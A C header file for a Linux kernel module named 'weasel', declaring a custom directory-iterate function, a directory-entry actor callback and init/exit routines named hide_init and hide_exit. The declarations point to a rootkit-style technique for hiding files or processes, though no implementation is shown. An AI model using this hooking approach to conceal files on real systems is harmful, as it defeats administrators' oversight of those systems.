#ifndef __WEASEL_HEADER__
#define __WEASEL_HEADER__

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/proc_fs.h>

MODULE_DESCRIPTION ("Module weasel.");
MODULE_AUTHOR ("VALERI Yoann");
MODULE_LICENSE ("GPL");

int my_actor(struct dir_context *ctx, const char *name, int nlen, loff_t off,
	u64 ino, unsigned x);
int my_iterate(struct file *fp, struct dir_context *ctx);

static int __init hide_init (void);
module_init (hide_init);

static void __exit hide_exit (void);
module_exit (hide_exit);

#endif